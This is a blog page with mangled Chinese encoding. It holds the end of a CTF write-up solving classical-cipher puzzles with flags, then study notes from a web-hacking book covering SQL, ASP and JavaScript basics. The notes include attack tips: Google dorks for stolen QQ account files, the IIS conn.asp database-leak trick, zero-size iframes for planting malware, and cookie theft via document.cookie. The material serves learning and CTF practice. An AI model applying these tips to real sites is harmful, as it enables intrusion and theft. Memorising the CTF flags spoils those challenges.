<p>æ ¹æ®wpï¼Œä¸ºä¸€ç§å˜å½¢çš„æ …æ å¯†ç Railfence-ciper</p>
<p>ä»£ç å†™èµ·æ¥æŒºå•°å—¦çš„ï¼Œæ‰¾ä¸€ä¸ªåœ¨çº¿çš„è§£ç å™¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br><span class="line">cyberpeace&#123;railfence_cipher_gogogo&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ä¸ä»…ä»…æ˜¯Morse"><a href="#ä¸ä»…ä»…æ˜¯Morse" class="headerlink" title="ä¸ä»…ä»…æ˜¯Morse"></a>ä¸ä»…ä»…æ˜¯Morse</h2><p>è€ƒå¯Ÿï¼šMorseï¼ŒåŸ¹æ ¹å¯†ç </p>
<p>æ‰“å¼€é™„ä»¶ï¼Œå¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;.-&#x2F;-.--&#x2F;..--.-&#x2F;-...&#x2F;.&#x2F;..--.-&#x2F;....&#x2F;.-&#x2F;...-&#x2F;.&#x2F;..--.-&#x2F;.-&#x2F;-.&#x2F;---&#x2F;-&#x2F;....&#x2F;.&#x2F;.-.&#x2F;..--.-&#x2F;-..&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;....&#x2F;....&#x2F;....&#x2F;....&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨åœ¨çº¿æ‘©æ ¹å¯†ç <a target="_blank" rel="noopener" href="http://moersima.00cha.net/%E8%A7%A3%E5%AF%86%E5%90%8E%EF%BC%8C%E5%BE%97%E5%88%B0">http://moersima.00cha.net/è§£å¯†åï¼Œå¾—åˆ°</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">may be have another decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</span><br></pre></td></tr></table></figure>
<p>ababçš„å¯èƒ½ä¸ºåŸ¹æ ¹å¯†ç ï¼Œ<a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></p>
<p>è§£å¯†åå¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACKANDDEFENCEWORLDISINTERESTING</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®é¢˜ç›®æç¤ºä¿®æ”¹ç›¸åº”æ ¼å¼åæäº¤flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;attackanddefenceworldisinteresting&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ··åˆç¼–ç "><a href="#æ··åˆç¼–ç " class="headerlink" title="æ··åˆç¼–ç "></a>æ··åˆç¼–ç </h2><p>è€ƒå¯Ÿï¼šASCIIç ï¼Œbase64ç¼–ç </p>
<p><strong>ç¬¬ä¸€æ­¥</strong></p>
<p>æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°ä»¥==ç»“å°¾ï¼Œä¸ºbase64ç¼–ç ï¼Œè§£ç åå¾—åˆ°å­—ç¬¦ä¸²</p>
<p><strong>ç¬¬äºŒæ­¥</strong></p>
<p>æ²¡å°äº128çš„ï¼ŒçŒœæµ‹æ˜¯ASCIIç ï¼Œå†™ä¸ªpythonè½¬æ¢ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119&quot;</span><br><span class="line">str &#x3D; str.split(&quot;;&amp;#&quot;);</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	text +&#x3D; chr(int(s))</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬ä¸‰æ­¥</strong></p>
<p>å°†å…¶è¿›è¡Œbase64è§£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">119&#x2F;101&#x2F;108&#x2F;99&#x2F;111&#x2F;109&#x2F;101&#x2F;116&#x2F;111&#x2F;97&#x2F;116&#x2F;116&#x2F;97&#x2F;99&#x2F;107&#x2F;97&#x2F;110&#x2F;100&#x2F;100&#x2F;101&#x2F;102&#x2F;101&#x2F;110&#x2F;99&#x2F;101&#x2F;119&#x2F;111&#x2F;114&#x2F;108&#x2F;100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>æœ€åä¸€æ­¥</strong></p>
<p>å°†å…¶è½¬æ¢ä¸ºascillç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcometoattackanddefenceworld</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ æ ¼å¼ï¼Œå³ä¸ºflag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" data-id="ckkdrz0z70007ugus60u76cr9" data-title="CTFç­”æ¡ˆè®°å½•" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ç²¾é€šé»‘å®¢è„šæœ¬ç¬”è®°" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2020-12-23T12:56:36.000Z" itemprop="datePublished">2020-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/">ç²¾é€šé»‘å®¢è„šæœ¬ç¬”è®°</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="ç¬¬ä¸‰ç« "><a href="#ç¬¬ä¸‰ç« " class="headerlink" title="ç¬¬ä¸‰ç« "></a>ç¬¬ä¸‰ç« </h2><h1 id="ç¬¬äºŒç« -å¸¸è§è„šæœ¬æ¼æ´æ¼”ç»ƒ"><a href="#ç¬¬äºŒç« -å¸¸è§è„šæœ¬æ¼æ´æ¼”ç»ƒ" class="headerlink" title="ç¬¬äºŒç«  å¸¸è§è„šæœ¬æ¼æ´æ¼”ç»ƒ"></a>ç¬¬äºŒç«  å¸¸è§è„šæœ¬æ¼æ´æ¼”ç»ƒ</h1><h2 id="Google-HackæŠ€æœ¯å¤§æ¼”ç»ƒ"><a href="#Google-HackæŠ€æœ¯å¤§æ¼”ç»ƒ" class="headerlink" title="Google HackæŠ€æœ¯å¤§æ¼”ç»ƒ"></a>Google HackæŠ€æœ¯å¤§æ¼”ç»ƒ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:ç®¡ç†ç™»å½• filetype:php # æœç´¢å­˜åœ¨æ•æ„Ÿä¿¡æ¯çš„ç½‘ç«™</span><br><span class="line">payment site:fr # æ³•å›½çš„ç›¸å…³æ”¯ä»˜ç•Œé¢</span><br><span class="line">inurl:qq.txt # æœç´¢è¢«ç›—çš„qqå·</span><br><span class="line">site:baidu.com # æœç´¢å­åŸŸå</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="æš´åº“æ¼æ´æ”»å‡»"><a href="#æš´åº“æ¼æ´æ”»å‡»" class="headerlink" title="æš´åº“æ¼æ´æ”»å‡»"></a>æš´åº“æ¼æ´æ”»å‡»</h2><p>conn.aspæ˜¯æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼ŒåŒ…å«äº†è¢«è°ƒç”¨æ•°æ®åº“çš„è·¯å¾„åŠæ•°æ®åº“å</p>
<p>conn.aspæš´åº“åŸç†ä¸ºï¼Œç›´æ¥è®¿é—®conn.aspæ—¶ï¼Œç›¸å¯¹è·¯å¾„å‡ºé”™</p>
<p>/æ”¹æˆ%5cã€‚%5cåœ¨16è¿›åˆ¶ä¸­ä¸º\ã€‚å½“IISé‡åˆ°\ï¼ŒIISä»¥ä¸ºé‡åˆ°äº†ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼Œä¾¿åœæ­¢è§£æï¼Œä»è€ŒæŠ¥é”™</p>
<h1 id="ç¬¬ä¸‰ç« -HTMLè¯­è¨€å…¥é—¨"><a href="#ç¬¬ä¸‰ç« -HTMLè¯­è¨€å…¥é—¨" class="headerlink" title="ç¬¬ä¸‰ç«  HTMLè¯­è¨€å…¥é—¨"></a>ç¬¬ä¸‰ç«  HTMLè¯­è¨€å…¥é—¨</h1><h2 id="è‡ªå®šä¹‰å¤´åƒè·¨ç«™æ¼æ´"><a href="#è‡ªå®šä¹‰å¤´åƒè·¨ç«™æ¼æ´" class="headerlink" title="è‡ªå®šä¹‰å¤´åƒè·¨ç«™æ¼æ´"></a>è‡ªå®šä¹‰å¤´åƒè·¨ç«™æ¼æ´</h2><p>è‹¥å†™å…¥è·¨ç«™ä»£ç åï¼Œè¿”å›æ•°æ®ä¸Šå‡ºç°å­—ç¬¦ï¼Œåˆ™å­˜åœ¨è·¨ç«™æ¼æ´ã€‚åªéœ€è¦å°†HTMLä¸­æ ‡ç­¾é—­åˆå³å¯ã€‚</p>
<h2 id="è¡¨å•"><a href="#è¡¨å•" class="headerlink" title="è¡¨å•"></a>è¡¨å•</h2><p>éšè—åŸŸé¡µé¢ä¸­ä¸é¥¿å»ºï¼Œé€šå¸¸ç”¨æ¥æ”¶é›†æˆ–å‘é€ä¿¡æ¯</p>
<h2 id="æ¡†æ¶"><a href="#æ¡†æ¶" class="headerlink" title="æ¡†æ¶"></a>æ¡†æ¶</h2><frameset>ä¸èƒ½æ”¾åœ¨<body>æˆ–<head>æ ‡ç­¾ä¸­

<p>åŠ¨æ€æ¡†æ¶<iframe>å¯ä»¥å®ç°åœ¨ç½‘é¡µå†…éƒ¨åµŒå…¥ç½‘é¡µï¼Œä½†æ˜¯å…¶ä¸­çš„srcå±æ€§ä¹Ÿå¸¦æ¥äº†æŒ‚é©¬é£é™©ã€‚æŒ‚é©¬æ—¶ï¼ŒæŠŠè¯¥æ ‡ç­¾çš„é«˜åº¦ã€å®½åº¦ã€frameborderè®¾ç½®ä¸º0</p>
<h1 id="ç¬¬å››ç« -Javascriptå’ŒVbscriptå…¥é—¨"><a href="#ç¬¬å››ç« -Javascriptå’ŒVbscriptå…¥é—¨" class="headerlink" title="ç¬¬å››ç«  Javascriptå’ŒVbscriptå…¥é—¨"></a>ç¬¬å››ç«  Javascriptå’ŒVbscriptå…¥é—¨</h1><p>é€šè¿‡Javascriptç¨‹åºï¼Œå¯ä»¥æ§åˆ¶webé¡µé¢çš„å¤–è§‚ï¼Œä¹Ÿèƒ½å¤Ÿæ£€æµ‹ç”¨æˆ·æ•°æ®çš„æœ‰æ•ˆæ€§ï¼Œè€Œè¿™äº›æ“ä½œéƒ½ä¸éœ€è¦å’ŒæœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œè¿™æ ·å°±å‡è½»äº†æœåŠ¡å™¨çš„å¤„ç†æ•°æ®è´Ÿæ‹…ã€‚</p>
<p>äº‹ä»¶æ˜¯Javascriptè®©é¡µé¢æ´»èµ·æ¥çš„é©±åŠ¨åŠ›ï¼Œæ‰€æœ‰çš„Javascriptéƒ½æ˜¯å¯¹æŸä¸ªäº‹ä»¶åšå‡ºçš„æ“ä½œå’Œååº”</p>
<h2 id="JavascriptåŸºç¡€"><a href="#JavascriptåŸºç¡€" class="headerlink" title="JavascriptåŸºç¡€"></a>JavascriptåŸºç¡€</h2><p>document.writeln()åœ¨æ·»åŠ <pre>æ ‡ç­¾åï¼Œæ‰ä¼šæœ‰æ¢è¡Œä½œç”¨ã€‚</p>
<p>ä¸‰ç§äº¤äº’æ–¹æ³•ï¼šalert()ï¼Œconfirm()ï¼Œprompt()</p>
<p>å˜é‡åŒºåˆ†å¤§å°å†™</p>
<p>BOMï¼Œbrowser object modelï¼Œæµè§ˆå™¨å¯¹è±¡æ¨¡å‹</p>
<p>é€šè¿‡Javascriptå†…ç½®å¯¹è±¡navigatoræˆ‘ä¹ˆå¯ä»¥çŸ¥é“å½“å‰ä½¿ç”¨çš„æµè§ˆå™¨æ˜¯é‚£ç§ç±»å‹ï¼Œé‚£ç§ç‰ˆæœ¬ï¼Œæ˜¯å¦æ”¯æŒjavaï¼Œå½“å‰æµè§ˆå™¨æ’ä»¶ä¿¡æ¯ç­‰</p>
<p>windowå¯¹è±¡åœ¨ä½¿ç”¨æ—¶ï¼Œå…è®¸çœç•¥ã€‚å¦‚window.alertçœç•¥ä¸ºalert</p>
<p>DOMï¼Œdocument object modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡å‹</p>
<p>document.cookieå¯ä»¥è·å–cookieï¼Œç”¨äºçªƒå–cookie</p>
<h2 id="VBScriptåŸºç¡€"><a href="#VBScriptåŸºç¡€" class="headerlink" title="VBScriptåŸºç¡€"></a>VBScriptåŸºç¡€</h2><p>VBScriptåªæœ‰ä¸€ç§æ•°æ®ç±»å‹Variant</p>
<p>ä¸ºäº†ä¸å½±å“ç¨‹åºè¿è¡Œæ•ˆç‡å’Œå…»æˆè‰¯å¥½å˜æˆä¹ æƒ¯ï¼Œå…ˆå£°æ˜å˜é‡å†èµ‹å€¼ã€‚ä½¿ç”¨dim</p>
<h2 id="ä½¿ç”¨cookie"><a href="#ä½¿ç”¨cookie" class="headerlink" title="ä½¿ç”¨cookie"></a>ä½¿ç”¨cookie</h2><p>é€šè¿‡document.cookieè¿›è¡Œè®¾ç½®å¹¶å–ç”¨</p>
<p>HTTP Set-Cookieå¤´çš„æ ¼å¼ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:name&#x3D;value;[expires&#x3D;date];[path&#x3D;pathname];[domain&#x3D;domainname];[secure];</span><br><span class="line">æ–¹æ‹¬å·ä¸ºå¯ä»¥çœç•¥çš„éƒ¨åˆ†</span><br></pre></td></tr></table></figure>
<p>è®¾ç½®cookieçš„æ ¼å¼ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;encodeURI(&quot;name&quot;)+&quot;&#x3D;&quot;+encodeURI(name)+&quot;;&quot;</span><br></pre></td></tr></table></figure>
<p>escapeå’ŒencodeURIéƒ½å¯ä»¥ç”¨æ¥å¯¹å­—ç¬¦è¿›è¡Œç¼–ç ã€‚escapeå°†éå­—æ¯å­—ç¬¦è½¬æ¢ä¸ºç”¨å­—ç¬¦å’Œæ•°å­—è¡¨ç¤ºçš„ç­‰ä»·å­—ç¬¦ä¸²ï¼›encodeURIç±»ä¼¼ã€‚</p>
<h2 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h2><h3 id="æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡æ–¹æ³•"><a href="#æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡æ–¹æ³•" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡æ–¹æ³•"></a>æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡æ–¹æ³•</h3><h4 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h4><p>lastIndexå±æ€§è¿”å›ä¸‹ä¸€æ¬¡å­—ç¬¦ä¸²æœç´¢å¼€å§‹çš„ä½ç½®ã€‚è‹¥ä¸ºå…¨å±€æœç´¢ï¼Œè¿”å›æœ€åä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä¸²åé¢ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>lastIndexå±æ€§è¿”å›å‰ä¸€æ¬¡åŒ¹é…å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®</p>
<h3 id="æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²å¯¹è±¡çš„æ–¹æ³•"><a href="#æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²å¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²å¯¹è±¡çš„æ–¹æ³•"></a>æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²å¯¹è±¡çš„æ–¹æ³•</h3><p>match,</p>
<h2 id="è·¨ç«™æ”»å‡»"><a href="#è·¨ç«™æ”»å‡»" class="headerlink" title="è·¨ç«™æ”»å‡»"></a>è·¨ç«™æ”»å‡»</h2><p>UBBï¼ŒUltimate Bulletin Boardï¼Œä¸€ç§tagè¯­æ³•ä»£ç </p>
<p>â‘  è¿‡æ»¤ç”¨æˆ·æäº¤å˜é‡ä¸­çš„&lt;å’Œ&gt;ï¼Œä»è€Œé˜²æ­¢ç”¨æˆ·è‡ªè¡Œæ„é€ htmlæ ‡è®°</p>
<p>â‘¡ è¿‡æ»¤å…¶ä¸­çš„ï¼šä»£ç ï¼Œä»è€Œé˜²æ­¢javascriptå’Œvbscriptçš„æ‰§è¡Œ</p>
<p>â‘¢ è¿‡æ»¤æˆ–è½¬æ¢ç©ºæ ¼å­—ç¬¦</p>
<h1 id="ç¬¬äº”ç« -æ•°æ®åº“åŸºç¡€"><a href="#ç¬¬äº”ç« -æ•°æ®åº“åŸºç¡€" class="headerlink" title="ç¬¬äº”ç«  æ•°æ®åº“åŸºç¡€"></a>ç¬¬äº”ç«  æ•°æ®åº“åŸºç¡€</h1><h2 id="åˆ©ç”¨SQLè¿›è¡Œæ•°æ®æŸ¥è¯¢"><a href="#åˆ©ç”¨SQLè¿›è¡Œæ•°æ®æŸ¥è¯¢" class="headerlink" title="åˆ©ç”¨SQLè¿›è¡Œæ•°æ®æŸ¥è¯¢"></a>åˆ©ç”¨SQLè¿›è¡Œæ•°æ®æŸ¥è¯¢</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tablename (field type[(size)][NOT NULL]&#123;, field type [(size)][NOT NULL]&#125;[, PRIMARY KEY(field&#123;,field...&#125;)]);</span><br><span class="line">SELECT[ALL|DISTINCT]&#123;expr[[AS]c_alias&#123;,expr[[AS]c_alias]...&#125;&#125; from tableref&#123;,tableref...&#125; [where&lt;search_condition]</span><br><span class="line">SELECT DISTINCT id FROM hack</span><br><span class="line">SELECT id AS æ ‡è¯†, name AS å§“å, city AS åŸå¸‚, age AS å¹´é¾„ FROM hack</span><br><span class="line">SELECT * FROM hack GROUP BY age</span><br><span class="line">SELECT * FROM hack WHERE city&#x3D;(SELECT city FROM hack WHERE id&#x3D;100)</span><br></pre></td></tr></table></figure>
<p>é›†åˆå‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COUNT(column_name) ç»Ÿè®¡column_nameåˆ—éç©ºçš„å…ƒç»„æ•°ç›®</span><br><span class="line">SUM(column_name) ç»Ÿè®¡column_nameåˆ—çš„å€¼çš„å’Œ</span><br><span class="line">AVG(column_name)</span><br><span class="line">MAX(column_name)</span><br><span class="line">MIN(column_name)</span><br></pre></td></tr></table></figure>
<p>å­æŸ¥è¯¢ç»“æœæ˜¯é›†åˆæ—¶ï¼Œè°“è¯­å…³é”®è¯å¯ä»¥ä½¿ç”¨INï¼ŒANY/ALLï¼ŒEXISTS</p>
<h1 id="ç¬¬å…­ç« -ASPåŸºç¡€"><a href="#ç¬¬å…­ç« -ASPåŸºç¡€" class="headerlink" title="ç¬¬å…­ç«  ASPåŸºç¡€"></a>ç¬¬å…­ç«  ASPåŸºç¡€</h1><h2 id="ASPå¸¸ç”¨å†…ç½®å¯¹è±¡"><a href="#ASPå¸¸ç”¨å†…ç½®å¯¹è±¡" class="headerlink" title="ASPå¸¸ç”¨å†…ç½®å¯¹è±¡"></a>ASPå¸¸ç”¨å†…ç½®å¯¹è±¡</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><p>ç”¨äºå¾—åˆ°ç”¨æˆ·æäº¤çš„æ•°æ®</p>
<p>ç”¨querystringè·å–GETï¼Œç”¨formè·å–POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myname&#x3D;request.querystring(&quot;name&quot;) #GETæ–¹å¼</span><br><span class="line">myname&#x3D;request.form(&quot;name&quot;) #POSTæ–¹å¼</span><br></pre></td></tr></table></figure>
<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>å°†æœåŠ¡å™¨æ•°æ®å‘é€åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸Š</p>
<p>writeæ–¹æ³•ï¼Œå°†æ•°æ®è¾“å‡ºåˆ°å®¢æˆ·ç«¯</p>
<p>redirectæ–¹æ³•ï¼Œé‡å®šå‘ï¼Œéœ€è¦è®¾ç½®Responseå¯¹è±¡çš„Bufferå±æ€§ä¸ºçœŸ</p>
<p>Statuså±æ€§ï¼ŒHTTPå“åº”çš„çŠ¶æ€ç </p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>æ‰©å±•aspåŠŸèƒ½ï¼Œå¯ä»¥åˆ©ç”¨ç¬¦åˆCOMæ¥å£çš„ç¬¬ä¸‰æ–¹ç»„ä»¶</p>
<p>CreateObject()æ–¹æ³•ï¼Œåˆ©ç”¨ç¬¦åˆCOMæ¥å£çš„ç¬¬ä¸‰æ–¹ç»„ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set myVar &#x3D; Server.CreateObject(&quot;ADODB.connection&quot;)</span><br></pre></td></tr></table></figure>
<p>HTMLEncode()æ–¹æ³•ï¼Œç”¨äºå­—ç¬¦ä¸²ç¼–ç ï¼Œå¯é˜²æ­¢è·¨ç«™æ¼æ´</p>
<p>URLEncode()æ–¹æ³•ï¼Œå­—ç¬¦ä¸²ä»¥URLçš„ç¼–ç è¾“å‡º</p>
<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„ä¿¡æ¯</p>
<h2 id="ASPç»„ä»¶"><a href="#ASPç»„ä»¶" class="headerlink" title="ASPç»„ä»¶"></a>ASPç»„ä»¶</h2><p>å³ActiveX</p>
<h2 id="ADO"><a href="#ADO" class="headerlink" title="ADO"></a>ADO</h2><p>ActiveX Data Objectsï¼ŒActiveXæ•°æ®å¯¹è±¡</p>
